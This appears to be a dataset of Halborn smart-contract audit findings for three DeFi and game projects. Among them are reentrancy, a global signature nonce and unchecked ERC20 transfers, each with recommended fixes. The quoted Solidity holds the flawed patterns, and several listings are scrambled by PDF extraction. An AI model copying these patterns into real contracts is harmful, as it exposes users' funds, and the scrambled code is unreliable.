        "title": "POOL DOES NOT SUPPORT FRACTIONAL FEE TOKEN TRANSFERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Hedera network allows creating token contracts with a fee on transfer (docs). There are two different ways to create this fee, that the fee is taken from the payer, or that the fee is taken from the received amount by the receiver. The ConcentratedLiquidityPool.sol contract, does not support tokens cre- ated with a fee on the receiver side, and any attempt to do add liquidity or a swap will revert. Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider adding support for tokens with fee on the receiver side. Remediation Plan: ACKNOWLEDGED: The BubbleSwap team acknowledged this issue, assuming it as a design constraint. 31 ",
        "labels": [
            "Halborn",
            "BubbleSwap_Concentrated_Liquidity_Pool_AMM",
            "Severity: Informational"
        ]
    },
    {
        "title": "PAYER FIELD NEVER USED ON MINTPARAMS STRUCTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The field payer declared as address on the MintParams struct of the IConcentratedLiquidityPool.sol is never used along the code base. Although the data structure is set as a required parameter on the mint function and that the manager does set this value to the msg.sender, the field is not used on the pool. Code Location: Code location - IConcentratedLiquidityPool.sol Listing 9: (Line 28) 27 struct MintParams { 28 29 30 31 32 33 34 35 } address payer ; int24 lowerOld ; int24 lower ; int24 upperOld ; int24 upper ; uint128 amount0Desired ; uint128 amount1Desired ; Risk Level: Likelihood - 1 Impact - 1 32 Recommendation: Consider removing the unused value or implementing the required code to use it. Remediation Plan: ACKNOWLEDGED: The BubbleSwap team acknowledged this finding. 33 ",
        "labels": [
            "Halborn",
            "BubbleSwap_Concentrated_Liquidity_Pool_AMM",
            "Severity: Informational"
        ]
    },
    {
        "title": "SQRTPRICELIMITX96 IS NOT USED ON V3SWAPROUTER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The parameter sqrtPriceLimitX96 declared as uint160 primitive type is set as a required input on exactInputSingle and exactInput functions. However, the parameter is not used. Code Location: Code Location - Listing 10 amountOut = exactInputInternal ( params . amountIn , params . recipient , params . sqrtPriceLimitX96 , SwapCallbackData ({ path : abi . encodePacked ( params . tokenIn , 1 function exactInputSingle ( ExactInputSingleParams memory params )  external payable override returns ( uint256 amountOut ) { 2 3 4 5 6  params . fee , params . tokenOut ) , payer : msg . sender }) 7 8  received \") ; 9 } ); require ( amountOut >= params . amountOutMinimum , \" Too little Risk Level: Likelihood - 1 Impact - 1 34 Recommendation: Consider removing the unused parameter in order to call the aforementioned functions. Remediation Plan: ACKNOWLEDGED: The BubbleSwap team wants to keep the parameter to ensure interface compatibility with other projects. 35 ",
        "labels": [
            "Halborn",
            "BubbleSwap_Concentrated_Liquidity_Pool_AMM",
            "Severity: Informational"
        ]
    },
    {
        "title": "CREATE CUSTOM ERRORS TO SAVE GAS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Custom errors are available from Solidity version 0.8.4. Custom errors save ~50 gas each time they are hit by avoiding having to allocate and store the revert string. Not defining strings also saves deployment gas. Although the project uses custom on errors on several contracts, the next contracts do not use them:  V3SwapRouter.sol.  ConcentratedLiquidityPoolStaker.sol.  ConcentratedLiquidityPoolHelper.sol.  ConcentratedLiquidityPoolManager.sol. Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider replacing all revert strings with custom errors. Remediation Plan: ACKNOWLEDGED: The BubbleSwap team acknowledged this finding. 36 3.10 (HAL-10) INCOMPLETE NATSPEC DOCUMENTATION - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "BubbleSwap_Concentrated_Liquidity_Pool_AMM",
            "Severity: Informational"
        ]
    },
    {
        "title": "SIGNATURE NONCES ARE IMPLEMENTED INCORRECTLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Mini_Miners_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the MinerGame contract, a nonce state variable is used to prevent signature replay attacks: Listing 1: MinerGame.sol 22 uint256 public nonce ; Listing 2: MinerGame.sol (Lines 63,72) { bytes32 hash bytes memory prefix bytes32 message require ( _nftId > 0, \" MinerGame : nft Id invalid \" ); = \" \\ x19Ethereum Signed Message :\\ n32 \"; = keccak256 ( abi . encodePacked ( _nftId , MineNFT nft = MineNFT ( mineNft ); require ( nft . ownerOf ( _nftId ) == msg . sender , \" MinerGame : Not 55 function importNft ( uint256 _nftId , uint8 _v , bytes32 _r , bytes32  _s ) external { 56 57 58 59  mineNft owner \" ); 60 61 62 63  msg . sender , address ( this ) , nonce )); 64  message )); 65 66 67  stakeToken \" ); 68 69 70 71 72 73 74 75 76 PlayerParams storage _player = player [ msg . sender ]; _player . nftId = _nftId ; _player . stakeTime = block . timestamp ; nft . safeTransferFrom ( msg . sender , address ( this ) , _nftId ); require ( recover == verifier , \" Verification failed about = keccak256 ( abi . encodePacked ( prefix , = ecrecover ( hash , _v , _r , _s ); address recover nonce ++; } 12 77 78 79 80 81 } mineOwners [ _nftId ] = msg . sender ; emit ImportNft ( msg . sender , _nftId , block . timestamp ); Listing 3: MinerGame.sol (Line 126) 114 function goldChangeToken ( uint256 _gold , uint8 _v , bytes32 _r ,  bytes32 _s ) external { 115 require ( _gold > 0, \" MinerGame : The exchange amount must  greater than zero \" ); 116 117 118 119 120 121 122 123 124 125  ; 126 uint256 chainId ; assembly { chainId := chainid () } PlayerParams storage _player = player [ msg . sender ]; { bytes memory prefix = \"\\ x19Ethereum Signed Message :\\ n32 \" bytes32 message = keccak256 ( abi . encodePacked ( _gold ,  msg . sender , nonce , address ( this ) , chainId )) ; 127 bytes32 hash = keccak256 ( abi . encodePacked ( prefix ,  message )); 128 129 130 address recover = ecrecover ( hash , _v , _r , _s ); require ( recover == verifier , \" Verification failed about  stakeToken \" ); } 131 132 133 134 135 136 137 138 nonce ++; uint256 _tokenAmount = _gold * MULTIPLIER / ratio ; _safeTransfer ( token [0] , msg . sender , _tokenAmount ); emit GoldChangeToken ( msg . sender , _gold , _tokenAmount , block .  timestamp ); 139 140 141 } } 13 This nonce variable is increased each time, the functions importNft() or goldChangeToken() are called. Although, the signer does not really know the order in which the users will call these functions. Hence, if the backend for example generates a signature for a user and this user does not call the function right after that, his signature will be invalid after someone else calls any of those functions. Risk Level: Likelihood - 5 Impact - 2 Recommendation: It is recommended to use a mapping instead of a global counter as a nonce to solve this issue: mapping(address => uint256)public _nonces; Remediation Plan: SOLVED: The Seascape team solved this issue and now uses the suggested mapping as a nonce. 14 ",
        "labels": [
            "Halborn",
            "Seascape_Mini_Miners",
            "Severity: Medium"
        ]
    },
    {
        "title": "REENTRANCY IN MINERGAME.EXPORTNFT FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Mini_Miners_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the MinerGame contract, the exportNft() function is used to unstake the Mine NFT: Listing 4: MinerGame.sol (Line 88) require ( mineOwners [ _nftId ] == msg . sender , \" MinerGame : Not the MineNFT nft = MineNFT ( mineNft ); nft . safeTransferFrom ( address ( this ) , msg . sender , _nftId ); 84 function exportNft ( uint256 _nftId ) external { 85  owner \" ); 86 87 88 89 90 91 92 93 94 95 96 97 } PlayerParams storage _player = player [ msg . sender ]; delete _player . nftId ; delete _player . stakeTime ; delete mineOwners [ _nftId ]; emit ExportNft ( msg . sender , _nftId , block . timestamp ); As we can see above, the Mine NFT is sent back to the user with safeTransferFrom() check This a if the contract is receiver the _checkOnERC721Received hook. safeTransferFrom() if call. a smart calls calls so, and it This passed the control flow to the receiver and opens up a reentrancy vulnerability as the user, in this case the smart contract, got the NFT but the state variables player[msg.sender] and mineOwners[_nftId] are still not deleted/updated. 15 Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to add a nonReentrant modifier to the exportNft() function. Other option is updating the exportNft() function as shown below: Listing 5: MinerGame.sol (Line 96) require ( mineOwners [ _nftId ] == msg . sender , \" MinerGame : Not the MineNFT nft = MineNFT ( mineNft ); 84 function exportNft ( uint256 _nftId ) external { 85  owner \" ); 86 87 88 89 90 91 92 93 94 95 96 97 } PlayerParams storage _player = player [ msg . sender ]; delete _player . nftId ; delete _player . stakeTime ; delete mineOwners [ _nftId ]; emit ExportNft ( msg . sender , _nftId , block . timestamp ); nft . safeTransferFrom ( address ( this ) , msg . sender , _nftId ); Remediation Plan: SOLVED: The Seascape team solved this issue and updated the exportNft() function as suggested. 16 ",
        "labels": [
            "Halborn",
            "Seascape_Mini_Miners",
            "Severity: Low"
        ]
    },
    {
        "title": "UNUSED STORAGE POINTER IN MINERGAME.GOLDCHANGETOKEN FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Mini_Miners_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the MinerGame contract the goldChangeToken() creates a storage pointer to the player mapping, but then it does not make any use of it: Listing 6: MinerGame.sol (Line 122) 114 function goldChangeToken ( uint256 _gold , uint8 _v , bytes32 _r ,  bytes32 _s ) external { 115 require ( _gold > 0, \" MinerGame : The exchange amount must greater  than zero \"); 116 117 118 119 120 121 122 123 124 125 126 uint256 chainId ; assembly { chainId := chainid () } PlayerParams storage _player = player [ msg . sender ]; { bytes memory prefix bytes32 message = \" \\ x19Ethereum Signed Message :\\ n32 \"; = keccak256 ( abi . encodePacked ( _gold ,  msg . sender , nonce , address ( this ) , chainId )) ; 127 bytes32 hash = keccak256 ( abi . encodePacked ( prefix ,  message )); 128 129 130 address recover = ecrecover ( hash , _v , _r , _s ); require ( recover == verifier , \" Verification failed about  stakeToken \" ); } nonce ++; uint256 _tokenAmount = _gold * MULTIPLIER / ratio ; _safeTransfer ( token [0] , msg . sender , _tokenAmount ); 131 132 133 134 135 136 137 17 138 emit GoldChangeToken ( msg . sender , _gold , _tokenAmount , block .  timestamp ); 139 140 } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to remove the pointer to the player mapping to reduce the gas costs of the goldChangeToken() function. Remediation Plan: SOLVED: The Seascape team solved this issue and removed the pointer to the player mapping. 18 ",
        "labels": [
            "Halborn",
            "Seascape_Mini_Miners",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Mini_Miners_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In multiple contracts there are functions marked as public but they are never directly called within the same contract or in any of their descendants: MineNFTFactory.sol - mint() (MineNFTFactory.sol#34-37) - setNft() (MineNFTFactory.sol#42-44) - addAdmin() (MineNFTFactory.sol#47-50) - renounceAdmin() (MineNFTFactory.sol#53-56) - addGenerator() (MineNFTFactory.sol#85-88) - removeGenerator() (MineNFTFactory.sol#91-94) MineNFT.sol - mint() (MineNFT.sol#35-46) - setOwner() (MineNFT.sol#48-50) - setFactory() (MineNFT.sol#52-54) - setBaseUri() (MineNFT.sol#56-58) MinerGame.sol - withdraw() (MinerGame.sol#188-195) - addToken() (MinerGame.sol#198-206) - setScale() (MinerGame.sol#209-212) CrownsToken.sol - burn() (CrownsToken.sol#96-98) - burnFrom() (CrownsToken.sol#111-118) - name() (CrownsToken.sol#127-129) - symbol() (CrownsToken.sol#135-137) - decimals() (CrownsToken.sol#148-150) - totalSupply() (CrownsToken.sol#155-157) - balanceOf() (CrownsToken.sol#162-164) - transfer() (CrownsToken.sol#173-176) 19 - approve() (CrownsToken.sol#203-206) - transferFrom() (CrownsToken.sol#217-227) - increaseAllowance() (CrownsToken.sol#241-244) - decreaseAllowance() (CrownsToken.sol#260-268) MscpToken.sol - burn() (MscpToken.sol#96-98) - burnFrom() (MscpToken.sol#111-118) - name() (MscpToken.sol#127-129) - symbol() (MscpToken.sol#135-137) - decimals() (MscpToken.sol#148-150) - totalSupply() (MscpToken.sol#155-157) - balanceOf() (MscpToken.sol#162-164) - transfer() (MscpToken.sol#173-176) - approve() (MscpToken.sol#203-206) - transferFrom() (MscpToken.sol#217-227) - increaseAllowance() (MscpToken.sol#241-244) - decreaseAllowance() (MscpToken.sol#260-268) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the functions are not intended to be called internally or by their descendants, it is better to mark all of these functions as external to reduce the gas costs. Remediation Plan: SOLVED: The Seascape team solved this issue and declared the functions as external, reducing the gas costs. 20 ",
        "labels": [
            "Halborn",
            "Seascape_Mini_Miners",
            "Severity: Informational"
        ]
    },
    {
        "title": "STATE VARIABLES MISSING CONSTANT MODIFIER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Mini_Miners_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "State variables can be declared as constant or immutable. In both cases, the variables cannot be modified after the contract has been constructed. For constant variables, the value has to be fixed at compile-time, while for immutable, it can still be assigned at construction time. The following state variables are missing the constant modifier: CrownsToken.sol - Line 30: uint256 public limitSupply = 1111111111000000000000000000; /// 1.1 billion MscpToken.sol - Line 30: uint256 public limitSupply = 1111111111000000000000000000; /// 1.1 billion Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to add the constant modifier to the state variables mentioned. Remediation Plan: SOLVED: The Seascape team solved this issue and declared the suggested state variables as constants. 21 ",
        "labels": [
            "Halborn",
            "Seascape_Mini_Miners",
            "Severity: Informational"
        ]
    },
    {
        "title": "INCOMPATIBILITY WITH NON",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Some tokens (like USDT) dont correctly implement the EIP20 standard and their transfer/transferFrom functions return void, instead of a success boolean. Calling these functions with the correct EIP20 function signatures will always revert as it is done in the contract AllRouterSwap .sol. Tokens that dont correctly implement the latest EIP20 spec, like USDT, will be unusable in the smart contract as they revert the transaction because of the missing return value. We recommend using OpenZeppelins SafeERC20 versions with the safeTransfer and safeTransferFrom functions that handle the return value check as well as non-standard-compliant tokens. On the other hand, in the 1st remediations Commit ID a0ff1260d21d253bab3b4ee053d8bbaf79ea6f2c the same issue with the approve function was added into the code. Proof of Concept: 13 Code Location:  require(IERC20(inputToken).transfer(msg.sender, _amountIn), errorMessage); (AllRouterSwap.sol#296)  require(IERC20(inputToken).transfer(msg.sender, _amountIn), errorMessage); (AllRouterSwap.sol#308) 1st remediations Commit ID a0ff1260d21d253bab3b4ee053d8bbaf79ea6f2c: Listing 1: AllRouterSwap.sol 165 bool approved = IERC20Upgradeable ( _tokenAddress ). approve ( address ( _router ) , _amountIn . add (100000000000000000000) ) ; 166 require ( approved , errorMessage ); Listing 2: AllRouterSwap.sol 196 bool approved = IERC20Upgradeable ( _firstPath ). approve ( address ( _router ) , _amountIn ); 197 require ( approved , errorMessage ); Listing 3: AllRouterSwap.sol 196 bool approved = IERC20Upgradeable ( _tokenAddress ). approve ( address ( _router ) , _amountIn . add (100000000000000000000) ) ; 197 require ( approved , errorMessage ); Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is recommended to use SafeERC20: safeTransfer and safeApprove. 14 Remediation Plan: SOLVED: and The MatrixSwap team The safeApprove. non-standard fe0037de0bf9254b82e6726ff38dda1da2e57dc. tokens ERC20 like USDT. Fixed correctly uses now contract is now safeTransfer with 7 compatible commit ID in 15 ",
        "labels": [
            "Halborn",
            "MatrixSwap_DEX_Aggregator",
            "Severity: High"
        ]
    },
    {
        "title": "UNCHECKED TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract AllRouterSwap.sol the return value of some external transfer/transferFrom calls are not checked. Several tokens do not revert in case of failure and return false. If one of these tokens is used, a deposit would not revert if the transfer fails, and an attacker could deposit tokens for free. Code Location:  IERC20(inputToken).transfer(owner,_fee) (AllRouterSwap.sol#148)  IERC20(_firstPath).transfer(owner,_fee) (AllRouterSwap.sol#176)  IERC20(_tokenAddress).transfer(owner,_fee) (AllRouterSwap.sol#196)  IERC20(_token).transferFrom(msg.sender,address(this),_amountIn) (AllRouterSwap.sol#211)  IERC20(inputToken).transferFrom(msg.sender,address(this),_amountIn [i]) (AllRouterSwap.sol#331) Risk Level: Likelihood - 2 Impact - 4 Recommendation: is It transfer/transferFrom return value is checked. recommended SafeERC20, use to or ensure that the Remediation Plan: SOLVED: safeTransferFrom. The MatrixSwap team correctly uses now safeTransfer and 16 ",
        "labels": [
            "Halborn",
            "MatrixSwap_DEX_Aggregator",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNUSED RETURN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The return value of some external calls are not stored in a local or state variable. In the contract AllRouterSwap.sol there are instances were external methods are being called and the return values are ignored. Code Location:  IERC20(_tokenAddress).approve(address(_router),_amountIn.add (100000000000000000000)) (AllRouterSwap.sol#150)  IERC20(_firstPath).approve(address(_router),_amountIn) (AllRouterSwap.sol#179)  _router.swapExactTokensForETH(_amountIn,_minimumAmountOut,_path, msg.sender,block.timestamp + 180) (AllRouterSwap.sol#180-186)  IERC20(_tokenAddress).approve(address(_router),_amountIn.add (100000000000000000000)) (AllRouterSwap.sol#199) Risk Level: Likelihood - 2 Impact - 3 Recommendation: Ensure that all the return values of the function calls are used. Add a return value check to avoid an unexpected crash of the contract. Remediation Plan: SOLVED: The MatrixSwap team correctly uses now safeApprove. 17 ",
        "labels": [
            "Halborn",
            "MatrixSwap_DEX_Aggregator",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was identified that the contract AllRouterSwap is missing nonReentrant guard in the public functions swap and swapToETH. Even if the functions are following the check-effects-interactions pattern we still recommend to use a mutex in order to be protected against cross-function reentrancy By using this lock, an attacker can no longer exploit the attacks. OpenZeppelin has its own mutex function with a recursive call. implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against the Reentrancy attacks. Code Location: Listing 4: AllRouterSwap.sol 312 function swap ( uint [] memory _amountIn , address [] memory _token , uint8 [][] memory _swapRoute , bool [] memory _isEth , address _tokenTarget , bool _isMultiToSingleToken , bool _isSingleEth , uint [] memory _minimumAmountOut , bool _isNukeTx ) public payable 313 { 314 315 316 317 318 319 320 321 322 323 324 325 isSingleEth = _isSingleEth ; isMultiToSingleToken = _isMultiToSingleToken ; isMultiSwap = _token . length > 1; isNukeTx = _isNukeTx ; for ( uint8 i = 0; i < _token . length ; i ++) { inputToken = SwapLibrary . _getToken ( _token [i ], _tokenTarget , _isMultiToSingleToken , true ); outputToken = SwapLibrary . _getToken ( _token [ i], _tokenTarget , _isMultiToSingleToken , false ); if (! _isSingleEth && ! _isMultiToSingleToken && _isEth [ i ]) { 18 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 _everySwapToEth ( _amountIn [i ], inputToken , _swapRoute [ i ], _minimumAmountOut [i ]) ; continue ; } else if (!( SwapLibrary . _isInputAllEth ( isMultiToSingleToken , isSingleEth ) || ( _isEth [ i ] && isMultiToSingleToken )) ) { } IERC20 ( inputToken ). transferFrom ( msg . sender , address ( this ) , _amountIn [ i ]) ; // 1 Router , 2 Tokens if ( _swapRoute [ i ][0] == _swapRoute [ i ][2] && _swapRoute [ i ][1] == 0) { } _twoTokensSwap ( routerList [ _swapRoute [ i ][0] -1] , _amountIn [i ], _isEth [i ], _minimumAmountOut [ i ]) ; // 1 Router , 3 Tokens else if ( _swapRoute [ i ][0] == _swapRoute [ i ][2] && _swapRoute [i ][1] > 0) { } _threeTokensSwap ( commonTokens [ _swapRoute [ i ][1] -1] , routerList [ _swapRoute [ i ][0] -1] , _amountIn [ i ], _isEth [i ], _minimumAmountOut [ i ]) ; // 2 Routers , 3 Tokens else if ( _swapRoute [ i ][0] != _swapRoute [ i ][2]) { _twoRoutersSwap ( commonTokens [ _swapRoute [i ][1] -1] , routerList [ _swapRoute [ i ][0] -1] , routerList [ _swapRoute [ i ][2] -1] , _amountIn [ i ], _isEth [ i ], _minimumAmountOut [ i ]) ; } } 350 351 352 } 353 354 function swapToETH ( uint [] memory _amountIn , address [] memory _token , uint8 [][] memory _swapRoute , uint [] memory _minimumAmountOut ) public 355 { 356 isMultiSwap = _token . length > 1; 19 357 358 359 360 361 for ( uint i = 0; i < _token . length ; i ++) { inputToken = _token [ i ]; outputToken = addressWETH ; _everySwapToEth ( _amountIn [ i ], _token [ i ], _swapRoute [ i], _minimumAmountOut [ i ]) ; 362 363 } } Risk Level: Likelihood - 1 Impact - 3 Recommendation: We recommend using ReentrancyGuard through the nonReentrant modifier. Remediation Plan: SOLVED: The MatrixSwap team correctly added the nonReentrant modifier. 20 ",
        "labels": [
            "Halborn",
            "MatrixSwap_DEX_Aggregator",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The During a manual review, we noticed the use of block.timestamp. contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of block.timestamp creates a risk that miners could perform time manipulation to influence price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location:  block.timestamp + 180 (AllRouterSwap.sol#139)  block.timestamp + 180 (AllRouterSwap.sol#156)  block.timestamp + 180 (AllRouterSwap.sol#185)  block.timestamp + 180 (AllRouterSwap.sol#205) Risk Level: Likelihood - 3 Impact - 1 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of Maximal Extractable Value (MEV) attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: SOLVED: The MatrixSwap team is not using block.timestamp anymore in the smart contract. 21 ",
        "labels": [
            "Halborn",
            "MatrixSwap_DEX_Aggregator",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Contracts should be deployed with the same compiler version and flags used during development and testing. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma. For example, an outdated pragma version might introduce bugs that affect the contract system negatively or recently released pragma versions may have unknown security vulnerabilities. Code Location: Listing 5 1 utils / SafeMath . sol :3: pragma solidity ^0.8.0; 2 utils / Initializable . sol :3: pragma solidity ^0.8.0; 3 TokenPrice . sol :2: pragma solidity ^0.8.0; 4 library / SwapLibrary . sol :2: pragma solidity ^0.8.0; 5 Box . sol :3: pragma solidity ^0.8.0; 6 ApprovedTokens . sol :2: pragma solidity ^0.8.7; 7 AllRouterSwap . sol :2: pragma solidity ^0.8.7; 8 AdminBox . sol :3: pragma solidity ^0.8.0; Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is not recommended to use a Consider locking the pragma version. floating pragma in production. It is possible to lock the pragma by fixing the version both in truffle-config.js for Truffle framework or in hardhat.config.js for HardHat framework. 22 Remediation Plan: SOLVED: The MatrixSwap team correctly locked the pragma version to the 0.8.7 version. 23 ",
        "labels": [
            "Halborn",
            "MatrixSwap_DEX_Aggregator",
            "Severity: Low"
        ]
    },
    {
        "title": "EXTERNAL CALLS WITHIN A LOOP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Calls inside a loop might lead to a Denial of Service attack. If the i variable iterates up to a very high value or is reset by the external functions called, this could cause a Denial of Service. Code Location: ApprovedTokens.sol Listing 6: ApprovedTokens.sol (Lines 29,31,35) external view returns ( address [] memory ) 23 function searchApprovedTokens ( address [] memory _tokens ) 24 25 26 27 { 28 address [] memory _approvedTokens = new address []( _tokens . length ); for ( uint16 i = 0; i < _tokens . length ; i ++) { console . log ( \" token :\" , _tokens [i ]) ; uint256 _allowance = IERC20 ( _tokens [i ]) . allowance ( msg . sender , swapContract ); uint256 _balance = IERC20 ( _tokens [ i ]) . balanceOf ( msg . sender ); // console . log (\" _allowance :\" , _allowance ) ; // console . log (\" _balance :\" , _balance ) ; if ( _allowance > _balance ) { _approvedTokens [ i ] = ( _tokens [ i ]) ; } } return _approvedTokens ; 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 } 24 AllRouterSwap.sol Listing 319,321,322,326,329,331,337,343,349,357,361) 7: AllRouterSwap.sol (Lines 312 function swap ( uint [] memory _amountIn , address [] memory _token , uint8 [][] memory _swapRoute , bool [] memory _isEth , address _tokenTarget , bool _isMultiToSingleToken , bool _isSingleEth , uint [] memory _minimumAmountOut , bool _isNukeTx ) public payable 313 { 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 isSingleEth = _isSingleEth ; isMultiToSingleToken = _isMultiToSingleToken ; isMultiSwap = _token . length > 1; isNukeTx = _isNukeTx ; for ( uint8 i = 0; i < _token . length ; i ++) { inputToken = SwapLibrary . _getToken ( _token [i ], _tokenTarget , _isMultiToSingleToken , true ); outputToken = SwapLibrary . _getToken ( _token [ i], _tokenTarget , _isMultiToSingleToken , false ); if (! _isSingleEth && ! _isMultiToSingleToken && _isEth [ i ]) { _everySwapToEth ( _amountIn [i ], inputToken , _swapRoute [ i ], _minimumAmountOut [i ]) ; continue ; } else if (!( SwapLibrary . _isInputAllEth ( isMultiToSingleToken , isSingleEth ) || ( _isEth [ i ] && isMultiToSingleToken )) ) { } IERC20 ( inputToken ). transferFrom ( msg . sender , address ( this ) , _amountIn [ i ]) ; // 1 Router , 2 Tokens if ( _swapRoute [ i ][0] == _swapRoute [ i ][2] && _swapRoute [ i ][1] == 0) { } _twoTokensSwap ( routerList [ _swapRoute [ i ][0] -1] , _amountIn [i ], _isEth [i ], _minimumAmountOut [ i ]) ; // 1 Router , 3 Tokens else if ( _swapRoute [ i ][0] == _swapRoute [ i ][2] && 25 342 343 344 345 346 347 348 349 _swapRoute [i ][1] > 0) _threeTokensSwap ( commonTokens [ _swapRoute [ i ][1] -1] , routerList [ _swapRoute [ i ][0] -1] , _amountIn [ i ], _isEth [i ], _minimumAmountOut [ i ]) ; { } // 2 Routers , 3 Tokens else if ( _swapRoute [ i ][0] != _swapRoute [ i ][2]) { _twoRoutersSwap ( commonTokens [ _swapRoute [i ][1] -1] , routerList [ _swapRoute [ i ][0] -1] , routerList [ _swapRoute [ i ][2] -1] , _amountIn [ i ], _isEth [ i ], _minimumAmountOut [ i ]) ; } } 350 351 352 } 353 354 function swapToETH ( uint [] memory _amountIn , address [] memory _token , uint8 [][] memory _swapRoute , uint [] memory _minimumAmountOut ) public 355 { 356 357 358 359 360 361 362 363 } isMultiSwap = _token . length > 1; for ( uint i = 0; i < _token . length ; i ++) { inputToken = _token [ i ]; outputToken = addressWETH ; _everySwapToEth ( _amountIn [ i ], _token [ i ], _swapRoute [ i], _minimumAmountOut [ i ]) ; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: If possible, use pull over push strategy for external calls or limit the max. size of the arrays being iterated. 26 Remediation Plan: SOLVED: The MatrixSwap team correctly limited the maximum iterations of the loops by casting the i variable to uint8 and adding a require statement. For example: Listing 8: AllRouterSwap.sol (Lines 381,387) 379 function swapToETH ( uint [] memory _amountIn , address [] memory _token , uint8 [][] memory _swapRoute , uint [] memory _minimumAmountOut , uint [] memory _uintArray ) external nonReentrant 380 { 381 382 383 384 385 386 387 388 389 390 391 require ( _token . length < uint8 (40) , \" Block gas limit exceeded \" ) ; // uint [] memory _uintArray = [ _discount , _deadline ] isMultiSwap = _token . length > 1; discount = _uintArray [0]; deadline = _uintArray [1]; for ( uint8 i = 0; i < _token . length ; i ++) { inputToken = _token [ i ]; outputToken = addressWETH ; _everySwapToEth ( _amountIn [ i ], _token [ i ], _swapRoute [ i], _minimumAmountOut [ i ]) ; 392 393 } } 27 ",
        "labels": [
            "Halborn",
            "MatrixSwap_DEX_Aggregator",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
